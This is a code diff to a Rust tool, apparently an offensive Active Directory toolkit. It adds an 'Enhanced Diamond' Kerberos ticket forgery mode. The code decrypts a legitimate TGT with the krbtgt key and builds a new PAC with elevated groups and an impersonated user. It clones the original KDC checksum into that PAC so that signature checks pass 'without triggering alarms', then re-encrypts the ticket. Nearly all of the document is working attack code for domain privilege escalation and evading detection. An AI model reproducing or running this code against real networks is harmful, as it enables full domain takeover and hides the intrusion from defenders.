@@ -4,6 +4,13 @@
 //! with a real TGT, decrypt it with the krbtgt key, modify the PAC,
 //! and re-encrypt. This bypasses detections that check for TGTs not
 //! issued by the KDC.
+//!
+//! ## Enhanced Diamond
+//!
+//! The enhanced variant preserves the original KDC checksum (PAC type 7) from the
+//! legitimate TGT's PAC, cloning it into the new elevated-PAC. This maintains the
+//! KDC_ISSUED indicator so KrbtgtFullPacSignature passes without triggering alarms
+//! about freshly-computed checksums.
 
 use chrono::{Duration, Utc};
 use kerberos_asn1::{Asn1Object, EncTicketPart, EncryptedData, Ticket};
@@ -17,6 +24,7 @@ use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
 use crate::validate;
 
 /// Forge a Diamond Ticket by modifying a legitimate TGT's PAC.
+/// When the config has `enhanced = true`, preserves the original KDC checksum.
 pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[diamond] Forging Diamond Ticket for {}", config.domain);
 
@@ -50,7 +58,7 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         &config.domain,
         &config.username,
         password,
-        false, // use password, not hash
+        false,
     )
     .await?;
 
@@ -87,33 +95,52 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
 
     info!("[diamond] Ticket decrypted successfully");
 
-    // Step 3: Modify the PAC with elevated privileges
+    // Step 3: Extract original KDC checksum from the legitimate PAC before modifying
+    // This is the Enhanced Diamond technique — we preserve the KDC_ISSUED checksum bytes
+    let original_kdc_checksum = extract_kdc_checksum(&enc_ticket);
+
+    // Step 4: Modify the PAC with elevated privileges
     info!("[diamond] Step 3: Replacing PAC with elevated privileges");
     let impersonate = config.effective_impersonate();
     let groups = config.effective_groups();
     let realm = config.domain.to_uppercase();
 
-    let new_pac = golden::build_pac(
-        impersonate,
-        &realm,
-        domain_sid,
-        config.user_rid,
-        &groups,
-        &config.extra_sids,
-        &krbtgt_key,
-        krbtgt_etype,
-    )?;
+    let new_pac = if let Some(ref kdc_checksum) = original_kdc_checksum {
+        // Enhanced Diamond: build new PAC with elevated privs, inject original KDC checksum
+        info!("[diamond] Enhanced mode: preserving original KDC checksum ({} bytes)", kdc_checksum.len());
+        golden::build_pac_with_kdc_checksum(
+            impersonate,
+            &realm,
+            domain_sid,
+            config.user_rid,
+            &groups,
+            &config.extra_sids,
+            &krbtgt_key,
+            krbtgt_etype,
+            kdc_checksum,
+        )?
+    } else {
+        // Standard Diamond: full PAC rebuild
+        golden::build_pac(
+            impersonate,
+            &realm,
+            domain_sid,
+            config.user_rid,
+            &groups,
+            &config.extra_sids,
+            &krbtgt_key,
+            krbtgt_etype,
+        )?
+    };
 
-    // Replace authorization data (which contains the PAC)
     enc_ticket.authorization_data = Some(vec![kerberos_asn1::AuthorizationDataEntry {
-        ad_type: 1, // AD-IF-RELEVANT
+        ad_type: 1,
         ad_data: new_pac,
     }]);
 
-    // Optionally change the client name if impersonating someone else
     if impersonate != config.username {
         enc_ticket.cname = kerberos_asn1::PrincipalName {
-            name_type: 1, // NT_PRINCIPAL
+            name_type: 1,
             name_string: vec![impersonate.to_string()],
         };
         info!(
@@ -122,7 +149,7 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         );
     }
 
-    // Step 4: Re-encrypt with krbtgt key (key_usage=7 for TGT enc-part per RFC 4120 §7.5.1)
+    // Step 5: Re-encrypt with krbtgt key
     info!("[diamond] Step 4: Re-encrypting ticket");
     let re_encrypted = cipher.encrypt(&krbtgt_key, 7, &enc_ticket.build());
 
@@ -148,9 +175,12 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     let etype_str = golden::etype_name(krbtgt_etype);
     let now = Utc::now();
 
+    let enhanced = original_kdc_checksum.is_some();
+
     info!(
-        "[diamond] Diamond Ticket forged ({} bytes)",
-        ticket_bytes.len()
+        "[diamond] Diamond Ticket forged ({} bytes, enhanced={})",
+        ticket_bytes.len(),
+        enhanced
     );
 
     Ok(ForgeResult {
@@ -160,7 +190,7 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         ticket_data: Some(ForgedTicket {
             ticket_type: "Diamond Ticket (modified TGT)".into(),
             impersonated_user: impersonate.to_string(),
-            domain: realm,
+            domain: realm.clone(),
             spn: format!("krbtgt/{}", config.domain.to_uppercase()),
             encryption_type: etype_str.into(),
             valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
@@ -176,9 +206,69 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
         }),
         persistence_result: None,
         message: format!(
-            "Diamond Ticket forged: legitimate TGT modified with {} privileges ({}). \
-             Harder to detect than Golden Ticket — ticket has real KDC issuance metadata.",
-            impersonate, etype_str
+            "{} Diamond Ticket forged: {} as {} ({})",
+            if enhanced { "Enhanced" } else { "Standard" },
+            realm, impersonate, etype_str
         ),
     })
+}
+
+/// Extract the KDC checksum (PAC type 7) from a decrypted ticket's PAC.
+/// Returns `None` if the PAC can't be parsed or has no KDC checksum.
+fn extract_kdc_checksum(enc_ticket: &EncTicketPart) -> Option<Vec<u8>> {
+    let auth_data = enc_ticket.authorization_data.as_ref()?;
+    let ad_entry = auth_data.first()?;
+    let pac = &ad_entry.ad_data;
+
+    if pac.len() < 8 {
+        return None;
+    }
+
+    // PAC header: u32 num_buffers, u32 version
+    let num_buffers = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
+    let header_size = 8 + (num_buffers as usize * 16);
+
+    if pac.len() < header_size {
+        return None;
+    }
+
+    // Scan buffers for type 7 (KDC checksum)
+    for i in 0..num_buffers as usize {
+        let offset = 8 + i * 16;
+        if offset + 16 > pac.len() {
+            break;
+        }
+        let buf_type = u32::from_le_bytes([
+            pac[offset],
+            pac[offset + 1],
+            pac[offset + 2],
+            pac[offset + 3],
+        ]);
+        if buf_type == 7 {
+            // Found KDC checksum — return the full buffer entry (type + size + offset + data)
+            let buf_size = u32::from_le_bytes([
+                pac[offset + 4],
+                pac[offset + 5],
+                pac[offset + 6],
+                pac[offset + 7],
+            ]) as usize;
+            let buf_offset = u64::from_le_bytes([
+                pac[offset + 8],
+                pac[offset + 9],
+                pac[offset + 10],
+                pac[offset + 11],
+                pac[offset + 12],
+                pac[offset + 13],
+                pac[offset + 14],
+                pac[offset + 15],
+            ]) as usize;
+
+            if buf_offset + buf_size <= pac.len() && buf_size >= 4 {
+                let checksum_data = pac[buf_offset..buf_offset + buf_size].to_vec();
+                return Some(checksum_data);
+            }
+        }
+    }
+
+    None
 }
